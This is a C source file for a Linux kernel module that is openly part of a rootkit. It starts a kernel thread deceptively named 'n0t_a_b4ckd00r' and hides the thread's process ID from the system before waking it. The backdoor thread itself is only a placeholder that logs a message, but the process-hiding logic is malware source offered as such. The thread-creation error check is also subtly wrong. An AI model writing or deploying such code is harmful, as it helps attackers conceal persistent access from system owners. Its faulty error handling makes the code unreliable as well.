#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <asm/paravirt.h> // write_cr0

#include "config.h"
#include "backdoor.h"
#include "hiding.h"

struct task_struct* backdoor_thread;

static int backdoor_thread_fn(void* data){
	while (!kthread_should_stop()){
		printk(KERN_INFO "ROOTKIT: Hello from thread!\n");
		msleep(5000);
	}
	return 0;
}

int __init backdoor_init(void){
	printk(KERN_INFO "ROOTKIT: Starting backdoor thread\n");
	backdoor_thread = kthread_create(backdoor_thread_fn, NULL, "n0t_a_b4ckd00r"); //max name length seems to be 15
	if (backdoor_thread < 0){
		printk(KERN_INFO "ROOTKIT: ERROR creating backdoor thread\n");
		return -1;
	}
	if (hide_pid(backdoor_thread->pid) == -1){
		printk(KERN_INFO "ROOTKIT: ERROR trying to hide backdoor thread\n");
		// I don't know if I should stop the thread here as it has not been woken up
		return -1;
	}
	wake_up_process(backdoor_thread);
	return 0;
}

void backdoor_exit(void){
	unhide_pid(backdoor_thread->pid);
	kthread_stop(backdoor_thread);
}
